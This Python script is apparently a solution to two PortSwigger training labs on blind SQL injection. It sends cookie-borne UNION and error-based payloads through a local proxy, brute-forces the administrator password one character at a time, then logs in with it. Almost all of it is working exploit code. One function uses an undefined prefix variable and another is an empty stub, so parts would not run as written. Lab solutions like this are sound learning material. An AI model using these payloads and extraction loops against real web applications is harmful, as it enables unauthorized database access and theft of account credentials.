# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import requests
requests.packages.urllib3.disable_warnings()

base = "https://ac3e1f191f04a61780e34c3400bc0067.web-security-academy.net"
url = base

proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
verify = False
cookies = {"session": "JXTZoDRywghW1LQyJUGMaFufdOlcmCTk"}
key = "TrackingId"
digitCodePoints = [i for i in range(48, 58)]
lowerCaseAlphabetCodePoints = [i for i in range(97, 123)]
codePointList = digitCodePoints + lowerCaseAlphabetCodePoints

def getSqliConditionalResponsesQuery(trueCondition):
    return f"' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND {trueCondition}"

def getSqliConditionalErrorsQuery(trueCondition):
    return f"' UNION SELECT CASE WHEN ({trueCondition}) THEN 1/0 ELSE NULL END-- "

def findNumberOfColumns():
    for i in range(1,5):
        value = f"' OR 1=1 ORDER BY {i}-- "
        cookies[key] = value
        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
        del cookies[key]

def determineStringLength():
    def makeRequest(func):
        for i in range(1,25):
            value = func(i)
            cookies[key] = value
            requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            del cookies[key]

    def usingConditionalResponse(i):
        return getSqliConditionalResponsesQuery(f"LENGTH(password) > {i}-- ")

    def usingConditionalError(i):
        return getSqliConditionalErrorsQuery(f"LENGTH(password) > {i}")

    # makeRequest(usingConditionalResponse)
    makeRequest(usingConditionalError)


def conditionalResponses(): # 20 len
    def findLengthOfTrueResponse():
        lengths = {}
        for i in codePointList:
            value = f"{sqliConditionalResponsesPrefix} SUBSTRING(password, 1, 1) = '{chr(i)}'-- "
            cookies[key] = value
            r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            l = len(r.content)
            if l in lengths:
                lengths[l] += 1
            else:
                lengths[l] = 1
                # print(f"{l}: {chr(i)}")

        for k, v in lengths.items():
            print(f"{k}: {v}")

    def determinePasswordUsingBruteForce():
        def getResponseFromRequest(i, operator, pwdSubstr):
            value = f"{sqliConditionalResponsesPrefix} SUBSTRING(password, {i}, 1) {operator} '{pwdSubstr}'-- "
            cookies[key] = value
            r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            del cookies[key]
            return r

        def makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, operator, pwdSubstr):
            lengthOfTrueResponse = 11030
            r = getResponseFromRequest(i, operator, pwdSubstr)
            l = len(r.content)
            return l == lengthOfTrueResponse

        password = []
        for i in range(1,21):
            for j in codePointList:
                pwdSubstr = chr(j)
                if makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, "=", pwdSubstr):
                    password.append(pwdSubstr)
                    break
        print(''.join(password))

    # findLengthOfTrueResponse()
    determinePasswordUsingBruteForce()

def conditionalErrors():
    pass
    #  then 1/0 else null end from users

def login():
    url = base + "/login"
    csrf = "VDykYVAf7v4IufftZGpFFeDanr409D8A"
    username = "administrator"
    password = "72qru00xujpoxc0epf23"
    data = {"csrf": csrf, "username": username, "password": password}
    requests.post(url, cookies=cookies, data=data, proxies=proxies, verify = verify)


# findNumberOfColumns()
determineStringLength()
# conditionalResponses()
# conditionalErrors()
# login()